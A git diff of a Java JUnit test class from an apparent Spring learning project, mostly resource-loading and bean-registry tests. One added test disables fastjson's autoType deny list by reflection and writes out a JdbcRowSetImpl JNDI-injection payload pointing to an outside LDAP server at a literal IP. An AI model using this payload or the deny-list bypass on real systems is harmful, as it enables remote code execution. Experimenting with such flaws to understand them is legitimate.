@@ -1,7 +1,11 @@
 package com.spring_1_100.test_1_10.test;
 
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.spring_1_100.test_1_10.test.service.Car;
 import com.spring_1_100.test_1_10.test.service.UserService;
 import org.junit.Test;
+import org.springframework.beans.factory.support.DefaultSingletonBeanRegistry;
 import org.springframework.context.ApplicationContext;
 import org.springframework.context.support.ClassPathXmlApplicationContext;
 import org.springframework.core.io.Resource;
@@ -9,6 +13,11 @@ import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
 import org.springframework.core.io.support.ResourcePatternResolver;
 
 import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.PreparedStatement;
 
 public class SpringTest1 {
 
@@ -30,7 +39,7 @@ public class SpringTest1 {
      */
     /**
      * 1.没有前缀：默认为项目的classpath下相对路径
-     *    ApplicationContext appCt = new ClassPathXmlApplicationContext("app.spring_test3.xml");
+     * ApplicationContext appCt = new ClassPathXmlApplicationContext("app.spring_test3.xml");
      * 对于这种情况，我们不做源码解读
      */
     @Test
@@ -42,7 +51,7 @@ public class SpringTest1 {
 
     /**
      * 2.前缀classpath：表示的是项目的classpath下相对路径
-     *    ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
+     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
      */
     @Test
     public void test1() {
@@ -52,9 +61,26 @@ public class SpringTest1 {
     }
 
 
+    @Test
+    public void test1_1() throws Exception {
+        ClassPathXmlApplicationContext ctx = new ClassPathXmlApplicationContext("classpath:spring_1_100/config_1_10/spring1_1.xml");
+        // 此时获取到容器帮我们创建的bean
+        Car car1 = (Car) ctx.getBean("car", "red");
+        System.out.println(JSON.toJSONString(car1));
+        DefaultSingletonBeanRegistry beanDefReg = (DefaultSingletonBeanRegistry) ctx.getBeanFactory();
+        Method method = DefaultSingletonBeanRegistry.class.getDeclaredMethod("removeSingleton", String.class);
+        System.out.println(method.getName());
+        method.setAccessible(true);
+        method.invoke(beanDefReg, new Object[]{"car"});
+        // 容器中bean己经被删除，因此调用getBean
+        Car car2 = (Car) ctx.getBean("car", "red");
+        System.out.println(JSON.toJSONString(car2));
+    }
+
+
     /**
      * 2.前缀classpath：表示的是项目的classpath下相对路径
-     *    ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
+     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
      */
     @Test
     public void test2() {
@@ -65,7 +91,7 @@ public class SpringTest1 {
 
     /**
      * 2.前缀classpath：表示的是项目的classpath下相对路径
-     *    ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
+     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
      */
     @Test
     public void test2_2() {
@@ -75,7 +101,6 @@ public class SpringTest1 {
     }
 
 
-
     @Test
     public void test2_3() {
         ApplicationContext ctx = new ClassPathXmlApplicationContext("spring_1_100/config_1_10/spring_test1/a/b/c/../../spring_test3.xml");
@@ -83,7 +108,7 @@ public class SpringTest1 {
         userService.query();
     }
 
-   @Test
+    @Test
     public void test2_4() {
         ApplicationContext ctx = new ClassPathXmlApplicationContext("classpath*:spring_1_100/**/spring_test4.xml");
         UserService userService = (UserService) ctx.getBean("userService");
@@ -96,7 +121,7 @@ public class SpringTest1 {
 
     /**
      * 3.使用前缀file 表示的是文件的绝对路径
-     *    ApplicationContext appCt = new ClassPathXmlApplicationContext("file:D:/app.spring_test3.xml");
+     * ApplicationContext appCt = new ClassPathXmlApplicationContext("file:D:/app.spring_test3.xml");
      */
 
     @Test
@@ -144,13 +169,13 @@ public class SpringTest1 {
             //Resource[] metaInfResources = resourcePatternResolver.getResources("classpath:spring_1_100/**/spring_test4.xml");
             //Resource[] metaInfResources = resourcePatternResolver.getResources("spring_1_100/config_1_10/spring_test1/a/b/c/../../spring_test3.xml");
             System.out.println(metaInfResources.length);
-        for(Resource r : metaInfResources){
-            System.out.println("URL:" + r.getURL());
+            for (Resource r : metaInfResources) {
+                System.out.println("URL:" + r.getURL());
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
         }
-    } catch (IOException e) {
-        e.printStackTrace();
     }
-}
 
 
 
@@ -176,6 +201,48 @@ public class SpringTest1 {
      * 5.使用通配符加载所有符合要求的文件
      *   ApplicationContext appCt2 = new FileSystemXmlApplicationContext("classpath:*.spring_test3.xml");
      */
+
+
+
+
+
+
+    @Test
+    public void testxx(){
+        ParserConfig parserConfig= ParserConfig.getGlobalInstance();
+        parserConfig.setAutoTypeSupport(true);
+        setFieldValue(parserConfig,"denyHashCodes",new long []{});
+
+        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://23.254.224.222:1388/Exploit\",\"autoCommit\":true}}";
+        payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.spring_1_100.test_1_10.test.TestHaha\"},\"x\":{\"@type\":\"com.spring_1_100.test_1_10.test.TestHaha\",\"dataSourceName\":\"xxxxx\",\"autoCommit\":true}}";
+        Object object = JSON.parse(payload);
+        System.out.println(object);
+
+    }
+
+    public static <T> T setFieldValue(Object target, String name, Object value) {
+        Field field = getField(target.getClass(), name);
+        if (field != null) {
+            try {
+                field.setAccessible(true);
+                field.set(target, value);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return null;
+    }
+
+    public static Field getField(Class clazz, String name) {
+        Field fields[] = clazz.getDeclaredFields();
+        for (Field field : fields) {
+            if (name.equals(field.getName())) {
+                return field;
+            }
+        }
+        return null;
+    }
+
 
 }
 
